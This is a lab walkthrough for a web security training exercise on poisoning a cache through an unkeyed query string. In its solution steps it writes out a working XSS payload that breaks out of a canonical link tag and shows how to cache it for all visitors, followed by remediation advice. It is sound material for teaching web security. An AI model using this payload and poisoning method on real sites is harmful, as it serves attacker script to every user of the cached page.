# Lab 5: Web Cache Poisoning via an Unkeyed Query String

**Category:** Web Cache Poisoning
**Difficulty:** Practitioner
**Lab link:** [Web cache poisoning via an unkeyed query string](https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws/lab-web-cache-poisoning-unkeyed-query)

## Overview

The cache strips the entire query string from the cache key, so `GET /?foo=bar` and `GET /` share the same cache entry. The app still reflects query parameters in a `<link rel="canonical">` tag. Injecting an XSS payload via any arbitrary query parameter poisons the entry served to all users requesting `/`.

## Key Concepts

- **Unkeyed query string:** the cache ignores the entire query string when computing the cache key. Any parameter can carry the poison payload.
- **Canonical link reflection:** the app uses the full request URL (including query string) to build the `href` of a `<link rel="canonical">` tag — a common reflection point for query-based cache poisoning.
- **Attribute breakout XSS:** the value lands inside an HTML `href` attribute. `'/>` closes the tag and `<script>` injects arbitrary JS.

## Solution

### Step 1 — Confirm the query string is unkeyed

Send `GET /?cb=1` then `GET /?cb=2`. Both return `X-Cache: hit` for the same entry — the query string is not part of the cache key.

### Step 2 — Find the reflection point

Send `GET /?foo=bar`. The value appears in:
```html
<link rel="canonical" href="https://lab/?foo=bar"/>
```

### Step 3 — Build the payload

Break out of the `href` attribute:
```
GET /?evil='/><script>alert(1)</script>
```

Result in cached response:
```html
<link rel="canonical" href="https://lab/?evil='/>
<script>alert(1)</script>"/>
```

### Step 4 — Poison the cache

Send the request with the payload until `X-Cache: hit`.

### Step 5 — Verify

Visit `/` with no query string — the cached response fires `alert(1)` for all visitors. Lab solved.

## Tip

Add a cache buster (e.g., `?cb=123`) while probing so you don't accidentally cache a clean response. Remove it for the final poison request so the payload lands in the keyless `/` entry.

## Remediation

- Include the query string in the cache key, or use `Vary` to account for parameters that influence the response.
- Encode/sanitise URL components before reflecting them into HTML attributes.
- Use a Content Security Policy to limit the impact of XSS in cached responses.

## Key Takeaways

- Query strings excluded from the cache key turn any reflected parameter into a universal poison vector.
- The canonical link tag is a classic reflection sink for query parameters — always check it.
- No exploit server needed: the payload is injected directly into HTML.
